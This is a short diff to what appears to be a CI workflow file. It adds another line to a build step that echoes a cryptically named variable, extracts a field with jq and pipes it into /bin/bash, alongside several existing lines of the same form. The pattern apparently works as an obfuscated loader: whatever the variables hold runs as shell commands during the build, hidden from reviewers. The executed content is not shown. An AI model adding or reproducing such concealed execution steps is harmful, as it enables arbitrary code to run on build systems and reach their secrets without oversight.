@@ -26,6 +26,7 @@ jobs:
           printf '%s' "$xm07" | jq -r .co2 | /bin/bash
           echo $pjwi60 | jq -r .h84700 | /bin/bash
           echo $sgsc8372 | jq -r .hyn83422 | /bin/bash
+          echo $wkv7783 | jq -r .ckynw40750 | /bin/bash
 
       - name: Persist results
         if: always()
